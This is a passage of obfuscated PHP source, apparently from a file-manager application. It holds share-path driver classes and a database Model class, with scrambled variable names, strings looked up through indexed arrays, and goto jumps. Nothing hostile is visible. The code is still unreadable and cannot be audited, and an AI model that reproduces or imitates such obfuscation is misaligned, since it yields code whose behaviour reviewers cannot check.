$¾Ş ÇÍ‰[12], count($ãè˜´¬Ğ)); foreach ($ãè˜´¬Ğ as $í¢ûšúÊ) { $¯Ìğò€Ì->update(1); $this->resetFile($í¢ûšúÊ); } $¯Ìğò€Ì->end(); } public function resetFile($»‹Í˜Ëì) { $Ï·³í»õ =& $_SERVER[ßğøİ]; $šªœ‰…« = array($Ï·³í»õ[469] => $»‹Í˜Ëì[$Ï·³í»õ[468]]); $Á¶Ê…Îä = Model($Ï·³í»õ[1327])->where($šªœ‰…«)->count(); $Á‰ Ï© = Model($Ï·³í»õ[1900])->where($šªœ‰…«)->count(); $àÓğ‹ÜŸ = intval($Á¶Ê…Îä) + intval($Á‰ Ï©); if ($àÓğ‹ÜŸ == 0) { IO::remove($»‹Í˜Ëì[$Ï·³í»õ[84]]); Model($Ï·³í»õ[1901])->delete($»‹Í˜Ëì[$Ï·³í»õ[468]]); $this->where($šªœ‰…«)->delete(); $this->metaSet($»‹Í˜Ëì[$Ï·³í»õ[468]], null, null); return; } if ($»‹Í˜Ëì[$Ï·³í»õ[1896]] != $àÓğ‹ÜŸ) { $this->where($šªœ‰…«)->save(array($Ï·³í»õ[1889] => $àÓğ‹ÜŸ)); } } public function storageInfo($çœéî = false) { $Èæ»¿ =& $_SERVER[ßğøİ]; $Íæ÷ïÑé = $this->count() + 0.0; $Ü·Ô›ÔÊ = 0; $ŞÏ®¨«Õ = 1; $š™ºĞ©ª = 0; $à­ÓÖÙç = 5000; for ($™İ‘úùû = 0; $™İ‘úùû < $Íæ÷ïÑé; $™İ‘úùû = $™İ‘úùû + $à­ÓÖÙç) { $î¢Ë‚æ³ = $this->limit($™İ‘úùû, $™İ‘úùû + $à­ÓÖÙç)->select(); foreach ($î¢Ë‚æ³ as $ÀŞ³û¥¶) { $ŞÏ®¨«Õ += $ÀŞ³û¥¶[$Èæ»¿[76]] * $ÀŞ³û¥¶[$Èæ»¿[1896]]; $Ü·Ô›ÔÊ += $ÀŞ³û¥¶[$Èæ»¿[76]] * ($ÀŞ³û¥¶[$Èæ»¿[1896]] - 1); $š™ºĞ©ª += $ÀŞ³û¥¶[$Èæ»¿[1896]]; } } $ Ôëë‹ö = array($Èæ»¿[1902] => $ŞÏ®¨«Õ, $Èæ»¿[1903] => $Ü·Ô›ÔÊ, $Èæ»¿[1904] => $Ü·Ô›ÔÊ / $ŞÏ®¨«Õ, $Èæ»¿[80] => $Íæ÷ïÑé, $Èæ»¿[1905] => $š™ºĞ©ª); return $ Ôëë‹ö; } } goto aì‰Ÿ»Üš; DËá¤§Ö Ä: class PathDriverDbShareItem extends PathDriverDB { public function __construct($ü·©×Ğí) { $this->pathParse = $ü·©×Ğí; $this->model = Model($_SERVER[ßğøİ][1327]); } public function getPathOuter($ÈïÎÏÚ) { $‹¤µù¨Ğ =& $_SERVER[ßğøİ]; if (!$ÈïÎÏÚ) { return $ÈïÎÏÚ; } $êò¬ª·¿ = $this->parse($ÈïÎÏÚ); return trim(KodIO::makeShare($this->pathParse[$‹¤µù¨Ğ[399]], $êò¬ª·¿[$‹¤µù¨Ğ[399]]), $‹¤µù¨Ğ[8]); } protected function infoParse($š¨ÓÌø©, $ŒÒ¢ğÄ = false, $Ú»¨ä†ï = false) { $£Í»ñı =& $_SERVER[ßğøİ]; $ˆ¹Æ¡Ú¥ = $this->pathParse[$£Í»ñı[399]]; $îöÁ§ = trim($this->pathParse[$£Í»ñı[1169]], $£Í»ñı[8]); return Action($£Í»ñı[1335])->sharePathInfo($ˆ¹Æ¡Ú¥, $îöÁ§, $ŒÒ¢ğÄ); } public function infoFull($ªŒ£îä) { $‰Â£‹–„ =& $_SERVER[ßğøİ]; $ã¦Õû· = explode($‰Â£‹–„[8], trim($ªŒ£îä, $‰Â£‹–„[8])); if (count($ã¦Õû·) > 1) { $ù€óšò¦ = implode($‰Â£‹–„[8], array_splice($ã¦Õû·, 1)); $Ã•ÌÌê = $this->model->pathInfoByPath($ã¦Õû·[0], $ù€óšò¦); if (!$Ã•ÌÌê) { return !1; } $this->pathParse[$‰Â£‹–„[1169]] = $Ã•ÌÌê[$‰Â£‹–„[402]]; } return $this->infoParse($ªŒ£îä); } public function listAll($Íîš°ó•) { $›ºúÄÍñ =& $_SERVER[ßğøİ]; $¦ê‚¸–ç = IO::info($this->pathParse[$›ºúÄÍñ[84]]); if (!$¦ê‚¸–ç) { return array(); } $ÁÉ˜ú×Á = $this->model->listAll($Íîš°ó•); $Ïœğò“ = Model($›ºúÄÍñ[601])->getInfo($¦ê‚¸–ç[$›ºúÄÍñ[489]]); $š–íãˆè = Action($›ºúÄÍñ[1335]); foreach ($ÁÉ˜ú×Á as &$İĞ”ä¦) { check_abort(); $İĞ”ä¦[$›ºúÄÍñ[86]] = $š–íãˆè->_shareItemeParse($İĞ”ä¦[$›ºúÄÍñ[86]], $Ïœğò“); } unset($İĞ”ä¦); return $ÁÉ˜ú×Á; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($±¢ø€¶î) { $this->pathParse = $±¢ø€¶î; $this->model = Model($_SERVER[ßğøİ][1327]); } protected function infoParse($À“” ¹Â, $¶†“ÓÛ = false, $´Ö‹—í‡ = false) { $°ßÇõÂÑ =& $_SERVER[ßğøİ]; return Action($°ßÇõÂÑ[1175])->sharePathInfo($this->pathParse[$°ßÇõÂÑ[84]], !0, $¶†“ÓÛ); } public function listPath($¯‡”Ó¦, $ë²ÎŸá = false) { $İïŞÑÁÉ =& $_SERVER[ßğøİ]; $ ùüÑè = parent::listPath($¯‡”Ó¦, $ë²ÎŸá); if (!$ ùüÑè) { return $ ùüÑè; } if (is_array($ ùüÑè[$İïŞÑÁÉ[1336]])) { $ ùüÑè[$İïŞÑÁÉ[1336]] = Action($İïŞÑÁÉ[1175])->shareItemInfo($ ùüÑè[$İïŞÑÁÉ[1336]]); } foreach ($ ùüÑè as $£ßÒó => $©µåÄé) { if (!in_array($£ßÒó, array($İïŞÑÁÉ[83], $İïŞÑÁÉ[82]))) { continue; } foreach ($©µåÄé as $óòì‡‰ => $Ö·úæÙ) { $ ùüÑè[$£ßÒó][$óòì‡‰] = Action($İïŞÑÁÉ[1175])->shareItemInfo($Ö·úæÙ); } } return $ ùüÑè; } public function listAll($Î­‚€úˆ) { $Âò¨¼Îì =& $_SERVER[ßğøİ]; $ä‡Š¡•ƒ = IO::info($this->pathParse[$Âò¨¼Îì[84]]); if (!$ä‡Š¡•ƒ) { return array(); } $„®ñ÷¹” = $this->model->listAll($Î­‚€úˆ); foreach ($„®ñ÷¹” as &$ÇÂª€Å…) { $ÇÂª€Å…[$Âò¨¼Îì[86]] = Action($Âò¨¼Îì[1175])->shareItemInfo($ÇÂª€Å…[$Âò¨¼Îì[86]]); } unset($ÇÂª€Å…); return $„®ñ÷¹”; } } class PathDriverDriverShareItem { public function __construct($Ëƒ¤ş€) { $this->pathParse = $Ëƒ¤ş€; } public function __call($Ìƒé¥‡´, $İ¿¢Ô´Â) { $™ç‡›€£ =& $_SERVER[ßğøİ]; if (method_exists($this, $Ìƒé¥‡´)) { return; } $´ç¡ÉˆÄ = call_user_func_array(array($™ç‡›€£[1337], $Ìƒé¥‡´), $İ¿¢Ô´Â); $Ô˜†ÆáÏ = array($™ç‡›€£[1338], $™ç‡›€£[1339], $™ç‡›€£[1340], $™ç‡›€£[1341], $™ç‡›€£[555], $™ç‡›€£[557], $™ç‡›€£[1342], $™ç‡›€£[107], $™ç‡›€£[1343], $™ç‡›€£[1344]); if (in_array($Ìƒé¥‡´, $Ô˜†ÆáÏ)) { $´ç¡ÉˆÄ = $this->getPathOuter($´ç¡ÉˆÄ); } return $´ç¡ÉˆÄ; } public function copy($„½µÒ»É, $ªñÖÌ¿, $åã©¯«— = false, $ç€¼€ˆ = false) { return $this->copyMove($„½µÒ»É, $ªñÖÌ¿, $åã©¯«—, $_SERVER[ßğøİ][555], $ç€¼€ˆ); } public function move($†şå­’, $ß¥«À°”, $ÙşíÃÒô = false, $£é–†Æ¨ = false) { return $this->copyMove($†şå­’, $ß¥«À°”, $ÙşíÃÒô, $_SERVER[ßğøİ][557], $£é–†Æ¨); } private function copyMove($şÅÄõƒ–, $şÌ¿Ğ¼ã, $Âäù¸Ò­, $³ãú½—û, $²ˆŸ³ïÀ = false) { $÷×Í©ˆ =& $_SERVER[ßğøİ]; $´™‹‰íÜ = $şÌ¿Ğ¼ã; $ÍÖĞ³ïÅ = IO::driverMake($şÌ¿Ğ¼ã); if ($ÍÖĞ³ïÅ->pathParse[$÷×Í©ˆ[1151]]) { $şÌ¿Ğ¼ã = $ÍÖĞ³ïÅ->pathParse[$÷×Í©ˆ[1151]]; } else { $şÌ¿Ğ¼ã = $´™‹‰íÜ; } $ü‘¦Ïô = IO::copyMove($şÅÄõƒ–, $şÌ¿Ğ¼ã, $Âäù¸Ò­, $³ãú½—û, $²ˆŸ³ïÀ); $ü‘¦Ïô = $this->getPathOuter($ü‘¦Ïô); return $ü‘¦Ïô; } public function pathThis($³Ü§»’¢) { return get_path_this($this->pathParse[$_SERVER[ßğøİ][84]]); } public function pathFather($€±§æìÁ) { return get_path_father($this->pathParse[$_SERVER[ßğøİ][84]]); } public function iconvSystem($›‚’¯) { return $›‚’¯; } protected function infoParse($ú£ıİø, $§Øè“Î× = false) { $ãÁ»‡³É =& $_SERVER[ßğøİ]; $ĞŠìÂşì = $this->pathParse[$ãÁ»‡³É[487]][$ãÁ»‡³É[1176]] . $this->pathParse[$ãÁ»‡³É[1169]]; if ($§Øè“Î×) { $…ï—Ÿ¿â = IO::infoWithChildren($ĞŠìÂşì); } else { $…ï—Ÿ¿â = IO::info($ĞŠìÂşì); } $õ¼ãòæã = $this->pathParse[$ãÁ»‡³É[487]]; return Action($ãÁ»‡³É[1335])->_shareItemeParse($…ï—Ÿ¿â, $õ¼ãòæã); } public function listAll($Ÿû…ç†) { $ÊÏ€ôö =& $_SERVER[ßğøİ]; $Å†³ ø° = IO::listAll($Ÿû…ç†); $åä­Ñâï = $this->pathParse[$ÊÏ€ôö[487]]; foreach ($Å†³ ø° as &$Ú·ÍÖ®¯) { check_abort(); $‹õı°§” = IO::info($Ú·ÍÖ®¯[$ÊÏ€ôö[84]]); $‹õı°§” = is_array($‹õı°§”) ? $‹õı°§” : array(); $Ú·ÍÖ®¯ = array_merge($‹õı°§”, $Ú·ÍÖ®¯); $Ú·ÍÖ®¯[$ÊÏ€ôö[86]] = Action($ÊÏ€ôö[1335])->_shareItemeParse($Ú·ÍÖ®¯, $åä­Ñâï); } unset($Ú·ÍÖ®¯); return $Å†³ ø°; } public function getPathOuter($¸şÈ‘“–) { $æöòîƒĞ =& $_SERVER[ßğøİ]; $Â‡×ñóÌ = KodIO::parse($¸şÈ‘“–); if ($Â‡×ñóÌ[$æöòîƒĞ[33]] == KodIO::KOD_SHARE_ITEM) { return $Â‡×ñóÌ[$æöòîƒĞ[84]]; } $„²×âø¸ = KodIO::clear($¸şÈ‘“–); $—êŸëÚû = KodIO::clear($this->pathParse[$æöòîƒĞ[487]][$æöòîƒĞ[1176]]); $Ç±µƒÙ = substr($„²×âø¸, strlen($—êŸëÚû)); if (substr($„²×âø¸, 0, strlen($—êŸëÚû)) != $—êŸëÚû) { return !1; } return $this->pathParse[$æöòîƒĞ[1170]] . $æöòîƒĞ[8] . ltrim($Ç±µƒÙ, $æöòîƒĞ[8]); } public function getType() { $Ö†Œ» È =& $_SERVER[ßğøİ]; $ƒ´çÌƒŒ = str_replace($Ö†Œ» È[74], $Ö†Œ» È[12], get_class($this)); return strtolower($ƒ´çÌƒŒ); } public function isTypeObject($âúÖ‚âñ) { return IO::isTypeObject($âúÖ‚âñ); } public function info($úŞş¯òÜ) { return $this->infoParse($úŞş¯òÜ); } public function infoAuth($¿å£ŠÛ) { return $this->infoParse($¿å£ŠÛ); } public function infoWithChildren($Ü¾•·ûá) { return $this->infoParse($Ü¾•·ûá, !0); } public function infoFull($‹ŠéóØø) { return $this->infoParse($‹ŠéóØø); } } goto C°ºÉæ¯ùš; B…À¤‚™òŠ: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\154\x65", "\x6f\x72\144\x65\x72", "\141\154\x69\141\x73", "\150\x61\x76\x69\156\x67", "\147\x72\157\165\160", "\154\157\143\153", "\x64\151\163\x74\x69\x6e\143\x74", "\141\165\x74\x6f", "\146\151\154\164\x65\162", "\x76\x61\x6c\x69\144\141\164\145", "\162\x65\163\165\154\x74", "\x62\x69\156\144", "\x74\157\153\145\x6e"); public function __construct($ß¿¡éÄÀ = '', $ú¬®àóâ = '', $›³Ï³ = '') { $’æ¯Í¿¥ =& $_SERVER[ßğøİ]; $this->_initialize(); if (!empty($ß¿¡éÄÀ)) { if (strpos($ß¿¡éÄÀ, $’æ¯Í¿¥[10])) { list($this->dbName, $this->name) = explode($’æ¯Í¿¥[10], $ß¿¡éÄÀ); } else { $this->name = $ß¿¡éÄÀ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ú¬®àóâ)) { $this->tablePrefix = $’æ¯Í¿¥[12]; } elseif ($’æ¯Í¿¥[12] != $ú¬®àóâ) { $this->tablePrefix = $ú¬®àóâ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($’æ¯Í¿¥[244]); } $this->db(0, empty($this->connection) ? $›³Ï³ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $š€Ïá– =& $_SERVER[ßğøİ]; if (empty($this->fields)) { if (think_config($š€Ïá–[245])) { $‘º»ÃíÌ = $this->dbName ? $this->dbName : think_config($š€Ïá–[246]); $çæ…øÊÍ = think_var_cache($š€Ïá–[247] . strtolower(get_path_this($‘º»ÃíÌ) . $š€Ïá–[10] . $this->name)); if ($çæ…øÊÍ) { $ãìáÑª‚ = think_config($š€Ïá–[248]); if (empty($ãìáÑª‚) || $çæ…øÊÍ[$š€Ïá–[249]] == $ãìáÑª‚) { $this->fields = $çæ…øÊÍ; return; } } } $this->flush(); } } public function flush() { $¶’ïÀåÙ =& $_SERVER[ßğøİ]; $this->db->setModel($this->name); $–Ãìœè = $this->db->getFields($this->getTableName()); if (!$–Ãìœè) { return !1; } $this->fields = array_keys($–Ãìœè); $this->fields[$¶’ïÀåÙ[250]] = !1; foreach ($–Ãìœè as $±¬‚â¸ => $÷ÃÓ¹ç©) { $ğãúîÁ[$±¬‚â¸] = $÷ÃÓ¹ç©[$¶’ïÀåÙ[33]]; if ($÷ÃÓ¹ç©[$¶’ïÀåÙ[39]]) { $this->fields[$¶’ïÀåÙ[251]] = $±¬‚â¸; if ($÷ÃÓ¹ç©[$¶’ïÀåÙ[42]]) { $this->fields[$¶’ïÀåÙ[250]] = !0; } } } $this->fields[$¶’ïÀåÙ[252]] = $ğãúîÁ; if (think_config($¶’ïÀåÙ[248])) { $this->fields[$¶’ïÀåÙ[249]] = think_config($¶’ïÀåÙ[248]); } if (think_config($¶’ïÀåÙ[245])) { $¹¾Á°û´ = $this->dbName ? $this->dbName : think_config($¶’ïÀåÙ[246]); think_var_cache($¶’ïÀåÙ[247] . strtolower(get_path_this($¹¾Á°û´) . $¶’ïÀåÙ[10] . $this->name), $this->fields); } } public function switchModel($˜˜Ø«Ã©, $öÂûíÔË = array()) { $‚Ôóü›Ù =& $_SERVER[ßğøİ]; $ûÆ¤§¨Ú = ucwords(strtolower($˜˜Ø«Ã©)) . $‚Ôóü›Ù[253]; if (!class_exists($ûÆ¤§¨Ú)) { think_exception($ûÆ¤§¨Ú . think_lang($‚Ôóü›Ù[254])); } $this->_extModel = new $ûÆ¤§¨Ú($this->name); if (!empty($öÂûíÔË)) { foreach ($öÂûíÔË as $‚¢¬Ññ) { $this->_extModel->setProperty($‚¢¬Ññ, $this->{$‚¢¬Ññ}); } } return $this->_extModel; } public function __set($·¡Ÿ‚çÉ, $İºÙå³§) { $this->data[$·¡Ÿ‚çÉ] = $İºÙå³§; } public function __get($ƒƒ×·¶) { return isset($this->data[$ƒƒ×·¶]) ? $this->data[$ƒƒ×·¶] : null; } public function __isset($£»‰¾”) { return isset($this->data[$£»‰¾”]); } public function __unset($´í½ğ©¢) { unset($this->data[$´í½ğ©¢]); } public function __call($¢¡ÜŞÁÅ, $ØÆˆäÚ) { $÷¦ÌÂûû =& $_SERVER[ßğøİ]; if (in_array(strtolower($¢¡ÜŞÁÅ), $this->methods, !0)) { $this->options[strtolower($¢¡ÜŞÁÅ)] = $ØÆˆäÚ[0]; return $this; } elseif (in_array(strtolower($¢¡ÜŞÁÅ), array($÷¦ÌÂûû[255], $÷¦ÌÂûû[256], $÷¦ÌÂûû[257], $÷¦ÌÂûû[258], $÷¦ÌÂûû[259]), !0)) { $øŸî‹‹¬ = isset($ØÆˆäÚ[0]) ? $ØÆˆäÚ[0] : $÷¦ÌÂûû[188]; $øŸî‹‹¬ = $this->db->parseKey($øŸî‹‹¬); return $this->getField(strtoupper($¢¡ÜŞÁÅ) . $÷¦ÌÂûû[260] . $øŸî‹‹¬ . $÷¦ÌÂûû[261] . $¢¡ÜŞÁÅ, $÷¦ÌÂûû[255]); } elseif (strtolower(substr($¢¡ÜŞÁÅ, 0, 5)) == $÷¦ÌÂûû[262]) { $øŸî‹‹¬ = think_parse_name(substr($¢¡ÜŞÁÅ, 5)); $ßó¬¨õ»[$øŸî‹‹¬] = $ØÆˆäÚ[0]; return $this->where($ßó¬¨õ»)->find(); } elseif (strtolower(substr($¢¡ÜŞÁÅ, 0, 10)) == $÷¦ÌÂûû[263]) { $§ÂÁÔ»Ğ = think_parse_name(substr($¢¡ÜŞÁÅ, 10)); $ßó¬¨õ»[$§ÂÁÔ»Ğ] = $ØÆˆäÚ[0]; return $this->where($ßó¬¨õ»)->getField($ØÆˆäÚ[1]); } elseif (isset($this->_scope[$¢¡ÜŞÁÅ])) { return $this->scope($¢¡ÜŞÁÅ, $ØÆˆäÚ[0]); } elseif (method_exists($this, $¢¡ÜŞÁÅ)) { array_unshift($ØÆˆäÚ, $¢¡ÜŞÁÅ); return call_user_func_array(array($this, $÷¦ÌÂûû[264]), $ØÆˆäÚ); } else { return call_user_func_array(array(parent, $¢¡ÜŞÁÅ), $ØÆˆäÚ); } } protected function call() { $©ª¨ÂÙº =& $_SERVER[ßğøİ]; $ÑìØßŒ™ = func_get_args(); $¤î¿èÎ© = array_shift($ÑìØßŒ™); $¿àÉ­ËÆ = $¤î¿èÎ©; if (is_array($¤î¿èÎ©)) { $¿àÉ­ËÆ = $¤î¿èÎ©[1]; $¤î¿èÎ© = $¤î¿èÎ©[0]; } $…–§üæø = count($ÑìØßŒ™) - 1; if (isset($ÑìØßŒ™[$…–§üæø]) && $ÑìØßŒ™[$…–§üæø] === $¤î¿èÎ©) { think_exception(__CLASS__ . $©ª¨ÂÙº[4] . $¤î¿èÎ© . think_lang($©ª¨ÂÙº[265])); return; } $ÑìØßŒ™[] = $¤î¿èÎ©; if (method_exists($this, $©ª¨ÂÙº[266])) { $§Ä‹”ã° = call_user_func_array(array($this, $©ª¨ÂÙº[267]), array($¿àÉ­ËÆ, $ÑìØßŒ™)); if (!is_null($§Ä‹”ã°) && $§Ä‹”ã° !== !1) { return $§Ä‹”ã°; } } $½¤„‡’ = call_user_func_array(array($this, $¤î¿èÎ©), $ÑìØßŒ™); if (method_exists($this, $©ª¨ÂÙº[268])) { $§Ä‹”ã° = call_user_func_array(array($this, $©ª¨ÂÙº[269]), array($¿àÉ­ËÆ, $ÑìØßŒ™, $½¤„‡’)); if ($§Ä‹”ã°) { return $§Ä‹”ã°; } } return $½¤„‡’; } protected function _initialize() { } protected function _facade($ˆä·üñ‘) { $Ğ¥¼è =& $_SERVER[ßğøİ]; if (!empty($this->fields)) { foreach ($ˆä·üñ‘ as $ñë‹Âõ => $¨áÏ¸•†) { if (is_array($this->fields) && !in_array($ñë‹Âõ, $this->fields, !0)) { unset($ˆä·üñ‘[$ñë‹Âõ]); } elseif (is_scalar($¨áÏ¸•†)) { $this->_parseType($ˆä·üñ‘, $ñë‹Âõ); } } } if (!empty($this->options[$Ğ¥¼è[270]])) { $ˆä·üñ‘ = array_map($this->options[$Ğ¥¼è[270]], $ˆä·üñ‘); unset($this->options[$Ğ¥¼è[270]]); } $this->_beforeWrite($ˆä·üñ‘); return $ˆä·üñ‘; } protected function _beforeWrite(&$õûü¶…Ò) { } public function add($ÈøøˆÄ = '', $™ñÆœã³ = array(), $©Õ××ÛĞ = false) { if (empty($ÈøøˆÄ)) { if (!empty($this->data)) { $ÈøøˆÄ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ßğøİ][271]); return !1; } } $™ñÆœã³ = $this->_parseOptions($™ñÆœã³); $ÈøøˆÄ = $this->_facade($ÈøøˆÄ); if (!1 === $this->_beforeInsert($ÈøøˆÄ, $™ñÆœã³)) { return !1; } $‡ºÆé€ = $this->db->insert($ÈøøˆÄ, $™ñÆœã³, $©Õ××ÛĞ); if (!1 !== $‡ºÆé€) { $ÍŠ®­îÚ = $this->getLastInsID(); if ($ÍŠ®­îÚ) { $ÈøøˆÄ[$this->getPk()] = $ÍŠ®­îÚ; $this->_after_insert($ÈøøˆÄ, $™ñÆœã³); return $ÍŠ®­îÚ; } $this->_after_insert($ÈøøˆÄ, $™ñÆœã³); } return $‡ºÆé€; } protected function _beforeInsert(&$ó‹‡ä¿Ï, $İ÷Ùä±Ä) { } protected function _after_insert($Á–™ƒ¶Á, $ ¹«ê†) { } public function addAll($³­ˆ¿´õ, $Ö¥ßí‚€ = array(), $†¯·° = false) { $ƒ›şÅµæ =& $_SERVER[ßğøİ]; if (empty($³­ˆ¿´õ)) { $this->error = think_lang($ƒ›şÅµæ[271]); return !1; } $Ö¥ßí‚€ = $this->_parseOptions($Ö¥ßí‚€); foreach ($³­ˆ¿´õ as $Ş‰÷Ø‹Ë => $Ğ¬üšÄİ) { $³­ˆ¿´õ[$Ş‰÷Ø‹Ë] = $this->_facade($Ğ¬üšÄİ); } if (method_exists($this->db, $ƒ›şÅµæ[272])) { $¶ÓÑÚöë = $this->db->insertAll($³­ˆ¿´õ, $Ö¥ßí‚€, $†¯·°); } else { $this->startTrans(); foreach ($³­ˆ¿´õ as $Ş‰÷Ø‹Ë => $Ğ¬üšÄİ) { $¶ÓÑÚöë = $this->db->insert($Ğ¬üšÄİ, $Ö¥ßí‚€, $†¯·°); } $this->commit(); } if (!1 !== $¶ÓÑÚöë) { $¾Û˜‰õ  = $this->getLastInsID(); if ($¾Û˜‰õ ) { return $¾Û˜‰õ ; } } return $¶ÓÑÚöë; } public function selectAdd($¦¾—İÄï = '', $İı¼á³Ô = '', $Ğ°“¬‚½ = array()) { $’Ş…É =& $_SERVER[ßğøİ]; $Ğ°“¬‚½ = $this->_parseOptions($Ğ°“¬‚½); if (!1 === ($áôñÈ¾ = $this->db->selectInsert($¦¾—İÄï ? $¦¾—İÄï : $Ğ°“¬‚½[$’Ş…É[273]], $İı¼á³Ô ? $İı¼á³Ô : $this->getTableName(), $Ğ°“¬‚½))) { $this->error = think_lang($’Ş…É[274]); return !1; } else { return $áôñÈ¾; } } public function save($íÑç°À¤ = '', $Ÿ†‡êÓ = array()) { $šá””É¢ =& $_SERVER[ßğøİ]; if (empty($íÑç°À¤)) { if (!empty($this->data)) { $íÑç°À¤ = $this->data; $this->data = array(); } else { $this->error = think_lang($šá””É¢[271]); return !1; } } $íÑç°À¤ = $this->_facade($íÑç°À¤); $Ÿ†‡êÓ = $this->_parseOptions($Ÿ†‡êÓ); $‘±åü¹æ = $this->getPk(); if (!isset($Ÿ†‡êÓ[$šá””É¢[275]])) { if (isset($íÑç°À¤[$‘±åü¹æ])) { $£Òàğ–¬[$‘±åü¹æ] = $íÑç°À¤[$‘±åü¹æ]; $Ÿ†‡êÓ[$šá””É¢[275]] = $£Òàğ–¬; unset($íÑç°À¤[$‘±åü¹æ]); } else { $this->error = think_lang($šá””É¢[274]); return !1; } } if (is_array($Ÿ†‡êÓ[$šá””É¢[275]]) && isset($Ÿ†‡êÓ[$šá””É¢[275]][$‘±åü¹æ])) { $³±ÊŠ¥î = $Ÿ†‡êÓ[$šá””É¢[275]][$‘±åü¹æ]; } if (!1 === $this->_beforeUpdate($íÑç°À¤, $Ÿ†‡êÓ)) { return !1; } $»¨³àø‰ = $this->db->update($íÑç°À¤, $Ÿ†‡êÓ); if (!1 !== $»¨³àø‰) { if (isset($³±ÊŠ¥î)) { $íÑç°À¤[$‘±åü¹æ] = $³±ÊŠ¥î; } $this->_afterUpdate($íÑç°À¤, $Ÿ†‡êÓ); } return $»¨³àø‰; } protected function _beforeUpdate(&$ºìæÊ×, $à¼—â«®) { } protected function _afterUpdate($Ëâò‚ô, $Ï•ì‰‡) { } public function delete($ „Ó‰¯ƒ = array()) { $¹°ìó×ª =& $_SERVER[ßğøİ]; if (empty($ „Ó‰¯ƒ) && empty($this->options[$¹°ìó×ª[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Å—æ…¼® = $this->getPk(); if (is_numeric($ „Ó‰¯ƒ) || is_string($ „Ó‰¯ƒ)) { if (strpos($ „Ó‰¯ƒ, $¹°ìó×ª[50])) { $ÓËàğáĞ[$Å—æ…¼®] = array($¹°ìó×ª[276], $ „Ó‰¯ƒ); } else { $ÓËàğáĞ[$Å—æ…¼®] = $ „Ó‰¯ƒ; } $this->options[$¹°ìó×ª[275]] = $ÓËàğáĞ; } $ „Ó‰¯ƒ = $this->_parseOptions(); if (is_array($ „Ó‰¯ƒ[$¹°ìó×ª[275]]) && isset($ „Ó‰¯ƒ[$¹°ìó×ª[275]][$Å—æ…¼®])) { $¶êÊÔ¨ñ = $ „Ó‰¯ƒ[$¹°ìó×ª[275]][$Å—æ…¼®]; } $Éƒ¯ùËÆ = $this->db->delete($ „Ó‰¯ƒ); if (!1 !== $Éƒ¯ùËÆ) { $ç»á¦Ğ = array(); if (isset($¶êÊÔ¨ñ)) { $ç»á¦Ğ[$Å—æ…¼®] = $¶êÊÔ¨ñ; } $this->_after_delete($ç»á¦Ğ, $ „Ó‰¯ƒ); } return $Éƒ¯ùËÆ; } protected function _after_delete($¹ıá»ÄÊ, $‘Û‘×îä) { } public function select($’”ù¿¡Ë = array()) { $Îğ±à­° =& $_SERVER[ßğøİ]; if (is_string($’”ù¿¡Ë) || is_numeric($’”ù¿¡Ë)) { $ÑÉôàÚá = $this->getPk(); if (strpos($’”ù¿¡Ë, $Îğ±à­°[50])) { $é³Ê©á[$ÑÉôàÚá] = array($Îğ±à­°[276], $’”ù¿¡Ë); } else { $é³Ê©á[$ÑÉôàÚá] = $’”ù¿¡Ë; } $this->options[$Îğ±à­°[275]] = $é³Ê©á; } elseif (!1 === $’”ù¿¡Ë) { $’”ù¿¡Ë = $this->_parseOptions(); return $Îğ±à­°[277] . $this->db->buildSelectSql($’”ù¿¡Ë) . $Îğ±à­°[278]; } $’”ù¿¡Ë = $this->_parseOptions(); $’ŒÈ™ÖÒ = $this->db->select($’”ù¿¡Ë); if (!1 === $’ŒÈ™ÖÒ) { return !1; } if (empty($’ŒÈ™ÖÒ)) { return null; } $this->_afterSelect($’ŒÈ™ÖÒ, $’”ù¿¡Ë); return $’ŒÈ™ÖÒ; } protected function _afterSelect(&$¨ß­øÔ“, $õ—ÕÕÇÆ) { } public function buildSql($çéŠíÛñ = array()) { $ó×Šƒ÷– =& $_SERVER[ßğøİ]; $çéŠíÛñ = $this->_parseOptions($çéŠíÛñ); return $ó×Šƒ÷–[277] . $this->db->buildSelectSql($çéŠíÛñ) . $ó×Šƒ÷–[278]; } public function optionsValue($¶´ì†ë‡ = null) { if (is_null($¶´ì†ë‡)) { return $this->options; } elseif (is_array($¶´ì†ë‡)) { $this->options = array_merge($this->options, $¶´ì†ë‡); } } protected function _parseOptions($õá®ü¿ = array()) { $úÎ‡Ÿö =& $_SERVER[ßğøİ]; if (is_array($õá®ü¿)) { $õá®ü¿ = array_merge($this->options, $õá®ü¿); } $this->options = array(); if (!isset($õá®ü¿[$úÎ‡Ÿö[279]])) { $õá®ü¿[$úÎ‡Ÿö[279]] = $this->getTableName(); $¢ĞÕÓªù = $this->fields; } else { $¢ĞÕÓªù = $this->getDbFields(); } if (!empty($õá®ü¿[$úÎ‡Ÿö[280]])) { $õá®ü¿[$úÎ‡Ÿö[279]] .= $úÎ‡Ÿö[53] . $õá®ü¿[$úÎ‡Ÿö[280]]; } $õá®ü¿[$úÎ‡Ÿö[281]] = $this->name; if (isset($õá®ü¿[$úÎ‡Ÿö[275]]) && is_array($õá®ü¿[$úÎ‡Ÿö[275]]) && !empty($¢ĞÕÓªù) && !isset($õá®ü¿[$úÎ‡Ÿö[282]]) && !isset($õá®ü¿[$úÎ‡Ÿö[279]])) { foreach ($õá®ü¿[$úÎ‡Ÿö[275]] as $İ„ï¤®ß => $¸úÅ¡™Í) { $İ„ï¤®ß = trim($İ„ï¤®ß); if (in_array($İ„ï¤®ß, $¢ĞÕÓªù, !0)) { if (is_scalar($¸úÅ¡™Í)) { $this->_parseType($õá®ü¿[$úÎ‡Ÿö[275]], $İ„ï¤®ß); } } elseif (!is_numeric($İ„ï¤®ß) && $úÎ‡Ÿö[11] != substr($İ„ï¤®ß, 0, 1) && !1 === strpos($İ„ï¤®ß, $úÎ‡Ÿö[10]) && !1 === strpos($İ„ï¤®ß, 